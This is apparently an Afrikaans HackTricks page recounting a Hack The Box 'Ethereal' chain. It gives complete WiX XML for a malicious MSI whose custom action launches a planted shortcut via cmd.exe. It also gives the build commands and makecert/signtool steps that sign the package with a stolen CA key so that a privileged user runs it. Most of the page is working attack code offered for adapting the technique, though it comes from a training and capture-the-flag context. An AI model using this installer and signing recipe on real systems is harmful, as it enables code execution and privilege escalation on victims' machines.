# Skep 'n Custom-Action MSI met WiX

{{#include ../../banners/hacktricks-training.md}}

Hierdie historiese Hack The Box-ketting het WiX Toolset v3 gebruik om 'n MSI te bou wat 'n voorheen geplante `.lnk`-lêer geloods het. **'n MSI het nie outomaties verhoogde voorregte nie**: uitvoering vind plaas in die konteks wat deur Windows Installer-beleid, die custom-action-kenmerke en die persoon wat dit installeer, bepaal word. In die scenario het die aanvaller ook 'n trusted signing CA gesteel en die signed MSI in 'n vouer geplaas wat deur 'n ander gebruiker gemonitor is.<sup>[[1]](#references)[[3]](#references)</sup>

Vir 'n omvattende begrip van wix MSI-gebruiksvoorbeelde, word dit aanbeveel om [hierdie bladsy](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) te raadpleeg. Hier kan jy verskeie voorbeelde vind wat die gebruik van wix MSI demonstreer.<sup>[[2]](#references)</sup>

Die MSI loop `C:\Users\Public\Desktop\Shortcuts\rick.lnk`. Die oorspronklike WiX v3 XML word hieronder bewaar:<sup>[[1]](#references)</sup>
```html
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
`InstallerVersion` verklaar die minimum Windows Installer-weergawe, en `Compressed="yes"` merk die pakket as compressed. `Stage1` is deferred, maar het `Impersonate="yes"`, dus loop dit met die installerende gebruiker se impersonated token; die privilege change in hierdie scenario het gekom van die privileged user wat die MSI later oopgemaak het, nie omdat daardie attribute op magiese wyse SYSTEM-toegang verleen nie.<sup>[[3]](#references)</sup>

Compileer die source na 'n WiX-object met `candle.exe`:<sup>[[1]](#references)</sup>
```
candle.exe -out C:\tmp\wix.wixobj C:\tmp\Ethereal\msi.xml
```
Koppel daardie objek aan ’n MSI met `light.exe`:<sup>[[1]](#references)</sup>
```
light.exe -out C:\tmp\Ethereal\rick.msi C:\tmp\wix.wixobj
```
### Ondertekeningstap wat in die oorspronklike ketting gebruik is

Die teikenwerkvloei het packages aanvaar wat deur ’n compromised interne CA signed is. Die write-up het ’n signing certificate uit die herstelde `MyCA.cer`/`MyCA.pvk` afgelei, ’n PFX geskep en die MSI signed:<sup>[[1]](#references)</sup>
```powershell
makecert.exe -n "CN=Ethereal" -pe -cy end `
-ic C:\tmp\MyCA.cer -iv C:\tmp\MyCA.pvk -sky signature `
-sv C:\tmp\rick.pvk C:\tmp\rick.cer
pvk2pfx.exe -pvk C:\tmp\rick.pvk -spc C:\tmp\rick.cer -pfx C:\tmp\rick.pfx
signtool.exe sign /f C:\tmp\rick.pfx C:\tmp\Ethereal\rick.msi
```
Die aanvaller het die signed package daarna in `D:\DEV\MSIs` geplaas en gewag dat die privileged workflow/user dit uitvoer. Behou daardie voorvereiste wanneer jy die technique aanpas: sonder ’n elevated installation path, onveilige policy soos `AlwaysInstallElevated`, of ’n privileged victim, voer hierdie package slegs met die huidige gebruiker se regte uit.

## References

- [1] [Hack The Box - Ethereal: Skep kwaadwillige msi en verkry root - 0xRick's Blog](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
- [2] [’n Vinnige inleiding: Skep ’n MSI-installeerder met WiX - CodeProject](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) (see also [wixtools](http://wixtoolset.org))
- [3] [Microsoft Learn — Uitgestelde uitvoering custom actions (`Impersonate`)](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-in-script-execution-options)
{{#include ../../banners/hacktricks-training.md}}
